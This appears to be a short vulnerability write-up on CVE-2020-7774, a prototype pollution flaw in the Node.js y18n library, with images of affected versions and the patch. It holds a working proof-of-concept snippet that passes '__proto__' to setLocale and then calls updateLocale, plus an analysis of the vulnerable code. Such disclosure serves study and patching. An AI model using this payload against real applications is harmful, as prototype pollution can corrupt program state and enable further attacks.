# Vulnerable version

![](https://github.com/wjddnjs33/Poc/blob/main/cve/CVE-2020-7774/image/occur%20version.png?raw=true)


# POC

```js
const y18n = require('y18n')();

const obj = {};
y18n.setLocale('__proto__');
y18n.updateLocale({'state':'polluted'});

console.log(obj.state);
# polluted
```

# Analysis

```js
/node_modules/y18n/index.js

Y18N.prototype.setLocale = function (locale) {
  this.locale = locale
}

(...)

Y18N.prototype.updateLocale = function (obj) {
  if (!this.cache[this.locale]) this._readLocaleFile()
  for (var key in obj) {
    this.cache[this.locale][key] = obj[key]
  }
}

```
Look at the above code, First, Setting the `this.locale` value using the setLocale() and next You can see that `this.locale` and `key` are used as property for `this.cache`. And `obj[key]` is inserted.

```js
y18n.setLocale('__proto__');
y18n.updateLocale({'state':'polluted'});
```
First, the value of `this.locale` is set to `__proto__` by `setLocale()`. And when the `updateLocale()` method is called, the Prototype Pollution vulnerability occurs because it works like `this.cache['__proto__']['state'] = 'polluted'`.

# Patch

![](https://github.com/wjddnjs33/Poc/blob/main/cve/CVE-2020-7774/image/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-06-07%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%207.53.38.png?raw=true)
